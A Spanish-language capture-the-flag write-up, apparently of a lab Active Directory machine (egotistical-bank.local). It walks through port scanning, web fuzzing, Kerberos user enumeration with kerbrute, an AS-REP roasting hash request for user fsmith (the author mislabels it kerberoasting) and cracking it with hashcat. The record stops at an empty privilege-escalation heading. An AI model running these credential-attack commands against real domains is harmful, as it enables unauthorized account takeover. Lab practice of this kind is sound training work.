## Resumen

### Herramientas

## Escaneo y enumeración
Hacemos nuestro escaneo de puertos hacía la IP buscando los abiertos TCP y encontramos algunos que pueden ser de utilidad como el 80, 88, 389, 445... Los cuales iremos investigando

```bash
sudo nmap -sS -Pn -p- -T4 --min-rate 5000 10.129.29.44
```

![](Pasted%20image%2020260505163022.png)

Ahora haré un escaneo más específico de versión para ver antes que servicios estamos. Y se puede ver que estamos ante un domino llamado egotistical-bank.local
```bash
sudo nmap -sCV 10.129.29.44
```

![](Pasted%20image%2020260505163547.png)


Investigando en su aplicación web encontramos un apartado en el que podemos ver por quienes está formado el equipo, seguramente estos nombres podamos verlos dentro del dominio

![](Pasted%20image%2020260505163739.png)

Ahora haré fuzzing a la web para comprobar si puede existir alguna información que nos sirva. No encontramos nada interesante

```bash
gobuster dir --url http://10.129.29.44/ --wordlist /usr/share/wordlists/DirectoryDiscovery/common.txt
```

![](Pasted%20image%2020260505163952.png)

Intentando listar los archivos compartidos como anónimo no tendremos permisos

![](Pasted%20image%2020260505164246.png)

Ahora procederé a hacer fuerza bruta con la aplicación kerbrute (https://kerbrute.com/#Installation) para poder encontrar usuarios que se encuentren en el dominio con el siguiente diccionario de Usuarios (https://github.com/danielmiessler/seclists). Haciendo fuerza bruta encontraremos que existe el usuario fsmith, el cuál concide con los nombre del equipo visto en la web

```bash
apt -y install seclists
```


```bash
./kerbrute userenum -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.129.29.44
```

![](Pasted%20image%2020260505170949.png)


## Explotación
Seguidamente haré kerberoasting y probaré a sacar el hash de fsmith. Y se completará existosamente

```bash
./GetNPUsers.py -request EGOTISTICAL-BANK.LOCAL/fsmith -format hashcat -outputfile hashFsmith -dc-ip 10.129.29.44
```

![](Pasted%20image%2020260505172222.png)


Para crackear el hash lo meteremos en un fichero ejecutaremos el crackeo con alguna aplicación del estilo, en mi caso usaré hashcat y tendremos la contraseña de fsmith

```bash
hashcat -m 18200 hashfSmith /usr/share/wordlists/rockyou.txt --force
```


![](Pasted%20image%2020260505172257.png)



## Escalado de privilegios